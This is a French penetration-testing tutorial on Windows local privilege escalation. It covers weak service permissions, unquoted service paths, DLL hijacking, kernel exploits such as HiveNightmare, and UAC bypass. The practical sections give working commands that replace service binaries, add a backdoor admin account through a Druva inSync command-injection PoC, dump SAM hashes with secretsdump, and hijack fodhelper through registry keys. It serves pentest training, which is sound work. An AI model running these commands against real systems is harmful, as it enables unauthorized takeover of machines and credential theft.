# Attaques sur le systeme d'exploitation

Au-dela des privileges et des groupes, le systeme d'exploitation Windows lui-meme presente des vecteurs d'escalade : permissions faibles sur les fichiers de services, services vulnerables, DLL hijacking, kernel exploits et contournement de l'UAC. Ces vecteurs sont parmi les plus frequemment rencontres en pentest.

## Pourquoi

Les logiciels tiers installent souvent des services avec des permissions trop permissives. Les developpeurs oublient de mettre les chemins de binaires entre guillemets, accordent l'ecriture sur les repertoires de service a tous les utilisateurs, ou deploient des applications qui ecoutent sur des ports locaux en SYSTEM sans authentification. Ces erreurs sont courantes, y compris sur des systemes par ailleurs bien patchs.

## Comment ca marche

### Permissions faibles

Trois variantes principales :

| Type | Description | Detection |
|---|---|---|
| **ACL faibles sur le binaire** | Le fichier `.exe` du service est modifiable par des utilisateurs non privilegies | `icacls <chemin>` ou SharpUp |
| **Permissions faibles sur le service** | La configuration du service elle-meme est modifiable (binpath, compte) | `accesschk.exe -quvcw <service>` |
| **Chemin non quote** (unquoted service path) | Le chemin du binaire contient des espaces sans guillemets | `wmic service get name,pathname \| findstr /v """` |

{% hint style="info" %}
Un chemin non quote comme `C:\Program Files\My App\service.exe` fait que Windows cherche d'abord `C:\Program.exe`, puis `C:\Program Files\My.exe`, puis le chemin complet. Si on peut ecrire dans un des repertoires intermediaires, on peut placer un binaire malveillant.
{% endhint %}

### DLL Injection et DLL Hijacking

La DLL injection consiste a charger une bibliotheque dans l'espace memoire d'un processus cible. Le DLL hijacking exploite l'ordre de recherche des DLL : si un service charge une DLL depuis un repertoire ou l'utilisateur peut ecrire, on peut y placer une version malveillante.

| Methode | Principe |
|---|---|
| **LoadLibrary** | Injection via `CreateRemoteThread` + `LoadLibraryA` dans le processus cible |
| **Manual Mapping** | Chargement manuel de la DLL sans passer par l'API Windows |
| **Thread Hijacking** | Redirection du flux d'execution d'un thread existant |
| **DLL Search Order Hijacking** | Placement d'une DLL malveillante dans un repertoire prioritaire |

### Kernel Exploits

Les vulnerabilites du noyau Windows permettent une escalade directe vers SYSTEM. Historiquement, des dizaines de CVE ont ete exploitees a cette fin, de MS08-067 a MS17-010 (EternalBlue) jusqu'aux vulnerabilites plus recentes comme HiveNightmare et PrintNightmare.

### User Account Control (UAC)

L'UAC n'est pas une frontiere de securite selon Microsoft, mais un mecanisme de confort qui demande une confirmation avant les actions administratives. Quand un compte administrateur se connecte, il recoit deux tokens : un non eleve (utilise par defaut) et un eleve (utilise apres consentement UAC). Contourner l'UAC permet d'acceder au token eleve sans passer par la boite de dialogue.

| Niveau UAC | Comportement |
|---|---|
| `0x0` | Pas de notification (desactive) |
| `0x1` | Notification sans secure desktop |
| `0x2` | Notification avec secure desktop (non-binaires Windows) |
| `0x5` | Notification pour les binaires non-Windows (defaut) |

## En pratique

### Permissions faibles sur un binaire de service

```powershell
# - Detecter les binaires de service modifiables
.\SharpUp.exe audit
# === Modifiable Service Binaries ===
# Name: SecurityService
# PathName: "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# - Verifier les permissions
icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
# BUILTIN\Users:(I)(F)
# Everyone:(I)(F)

# - Sauvegarder l'original et remplacer par un binaire malveillant
copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" C:\Temp\backup.exe
copy C:\Temp\malicious.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"

# - Redemarrer le service
sc start SecurityService
```

### Permissions faibles sur un service

```cmd
# - Detecter les services modifiables
accesschk.exe /accepteula -quvcw WindscribeService
# RW NT AUTHORITY\Authenticated Users
#         SERVICE_ALL_ACCESS

# - Modifier le binpath du service
sc config WindscribeService binpath= "cmd /c net localgroup administrators htb-student /add"

# - Arreter et redemarrer le service
sc stop WindscribeService
sc start WindscribeService
# Le service echoue mais la commande s'execute en SYSTEM

# - Verifier
net localgroup administrators
```

### Chemin de service non quote

```cmd
# - Detecter les chemins non quotes
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# - Exemple : C:\Program Files\My Software\Service App\svc.exe
# Windows cherche dans cet ordre :
# 1. C:\Program.exe
# 2. C:\Program Files\My.exe
# 3. C:\Program Files\My Software\Service.exe
# 4. C:\Program Files\My Software\Service App\svc.exe

# - Verifier les permissions en ecriture sur les repertoires
icacls "C:\Program Files\My Software"

# - Si l'ecriture est possible, placer un binaire
copy C:\Temp\malicious.exe "C:\Program Files\My Software\Service.exe"

# - Redemarrer le service
sc stop "Service App"
sc start "Service App"
```

### Service tiers vulnerable (exemple Druva inSync)

```powershell
# - Detecter les applications installees
wmic product get name
# Druva inSync 6.6.3

# - Verifier le port local
netstat -ano | findstr 6064
# TCP 127.0.0.1:6064    0.0.0.0:0    LISTENING    3324

# - Verifier le processus
Get-Process -Id 3324
# inSyncCPHwnet64

# - Exploit PoC (injection de commande via RPC local)
$ErrorActionPreference = "Stop"
$cmd = "net user pwnd Password123! /add && net localgroup administrators pwnd /add"
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)
# ... (envoi du payload RPC)
```

### Kernel Exploit : HiveNightmare (CVE-2021-36934)

```cmd
# - Verifier si le systeme est vulnerable
icacls C:\Windows\System32\config\SAM
# BUILTIN\Users:(I)(RX)
# Si les Users ont RX, le systeme est vulnerable

# - Exploiter avec le PoC
.\HiveNightmare.exe
# Copies creees : SAM, SECURITY, SYSTEM

# - Extraire les hashes sur la machine attaquante
python3 secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
```

### Contournement de l'UAC

{% tabs %}
{% tab title="Verification" %}
```cmd
# - Verifier si l'UAC est active
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
# EnableLUA    REG_DWORD    0x1

# - Verifier le niveau UAC
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
# ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
{% endtab %}
{% tab title="Bypass avec UACME" %}
```cmd
# - Utiliser UACME (repertoire de techniques de bypass)
# Le repo contient 70+ techniques classees par numero

# - Exemple : technique #33 (fodhelper.exe)
.\Akagi64.exe 33 cmd.exe

# - Le shell resultant tourne avec le token eleve
whoami /priv
# Tous les privileges du groupe Administrateurs sont visibles
```
{% endtab %}
{% tab title="Bypass fodhelper (manuel)" %}
```powershell
# - Creer la cle de registre pour le bypass
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd /c start C:\Temp\shell.exe" -Force

# - Lancer fodhelper.exe (auto-elevate sans prompt UAC)
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
L'UAC n'est pas une barriere de securite. Microsoft le considere comme un mecanisme de confort. En pentest, si on est dans le groupe Administrateurs local, contourner l'UAC est generalement trivial avec des outils comme UACME.
{% endhint %}

## Pieges et galeres

- **Unquoted path sans ecriture** : un chemin non quote n'est exploitable que si on peut ecrire dans un des repertoires intermediaires. Toujours verifier avec `icacls`
- **Service non redemarrable** : modifier le binpath ne sert a rien si on ne peut pas arreter et redemarrer le service. Verifier les permissions avec `sc sdshow <service>`
- **Kernel exploits et stabilite** : les exploits noyau peuvent provoquer un BSOD (Blue Screen of Death). Documenter la vulnerabilite sans l'executer en production
- **HiveNightmare et shadow copies** : l'exploit necessite la presence de Volume Shadow Copies. Verifier avec `vssadmin list shadows`
- **UAC et compte RID 500** : le compte Administrator integre (RID 500) fonctionne toujours avec le token eleve par defaut, meme avec l'UAC active. Les autres comptes admin recoivent un token non eleve
- **DLL hijacking et dependances** : la DLL malveillante doit exporter les memes fonctions que l'originale, sinon le service crash au chargement

## Memo express

| Commande | Usage |
|---|---|
| `.\SharpUp.exe audit` | Detection automatique de mauvaises configurations |
| `accesschk.exe -quvcw <service>` | Permissions sur un service |
| `icacls <chemin>` | Permissions sur un fichier/repertoire |
| `sc config <svc> binpath= "<cmd>"` | Modification du binaire de service |
| `wmic service get name,pathname` | Lister les chemins de services |
| `icacls C:\Windows\System32\config\SAM` | Verifier HiveNightmare |
| `REG QUERY ...Policies\System\ /v EnableLUA` | Verifier l'etat de l'UAC |
| `.\Akagi64.exe <num> cmd.exe` | Bypass UAC avec UACME |

***
